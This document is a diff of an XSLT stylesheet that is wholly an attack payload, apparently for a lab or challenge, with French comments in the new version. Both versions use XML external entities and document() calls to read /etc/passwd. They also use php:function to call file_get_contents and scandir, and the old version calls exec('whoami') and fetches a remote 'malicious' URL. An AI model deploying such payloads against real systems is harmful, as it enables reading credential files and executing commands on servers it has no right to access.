@@ -1,51 +1,35 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE xsl:stylesheet [
-<!ENTITY xxe SYSTEM "file:///etc/passwd">
-<!ENTITY network SYSTEM "http://example.com/malicious">
+  <!-- Tentative d'injection d'entité externe pour lire des fichiers -->
+  <!ENTITY ext_file SYSTEM "file:///etc/passwd">
+  <!ENTITY php_code SYSTEM "http://localhost/.passwd">
 ]>
 <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                 xmlns:php="http://php.net/xsl"
                 version="1.0">
-
-  <!-- XXE Exploits -->
+  
+  <!-- Exploit XXE : Tenter de récupérer /etc/passwd -->
   <xsl:template match="/">
-    <html>
-      <body>
-        <h2>--- XXE Exploits ---</h2>
-        <p>Reading /etc/passwd:</p>
-        <pre><xsl:value-of select="document('/etc/passwd')"/></pre>
-
-        <p>Reading via ENTITY:</p>
-        <pre>&xxe;</pre>
-      </body>
-    </html>
+    <xsl:text>--- XXE EXPLOIT ---</xsl:text>
+    <xsl:value-of select="document('file:///.passwd')"/>
+    <xsl:value-of select="ext_file"/>
   </xsl:template>
 
-  <!-- PHP Function Exploits -->
+  <!-- Injection PHP via fonction file_get_contents -->
   <xsl:template match="/php">
-    <html>
-      <body>
-        <h2>--- PHP Exploits ---</h2>
-        <p>File contents:</p>
-        <pre><xsl:value-of select="php:function('file_get_contents', '/etc/passwd')"/></pre>
-
-        <p>Scandir:</p>
-        <pre><xsl:value-of select="php:function('scandir', '.')"/></pre>
-
-        <p>Command Execution:</p>
-        <pre><xsl:value-of select="php:function('exec', 'whoami')"/></pre>
-      </body>
-    </html>
+    <xsl:text>--- PHP INJECTION ---</xsl:text>
+    <xsl:value-of select="php:function('file_get_contents','/.passwd')"/>
   </xsl:template>
 
-  <!-- Network Access -->
-  <xsl:template match="/network">
-    <html>
-      <body>
-        <h2>--- Network Access ---</h2>
-        <p>Accessing a remote file:</p>
-        <pre><xsl:value-of select="document('http://example.com/malicious')"/></pre>
-      </body>
-    </html>
+  <!-- Affichage du fichier de style -->
+  <xsl:template match="style">
+    <xsl:value-of select="php:function('scandir','.')"/>
   </xsl:template>
+
+  <!-- Affichage du résultat du fichier externe PHP -->
+  <xsl:template match="/.passwd">
+    <xsl:text>--- PHP MALICIOUS CODE ---</xsl:text>
+    <xsl:value-of select="document('http://localhost/.passwd')"/>
+  </xsl:template>
+  
 </xsl:stylesheet>
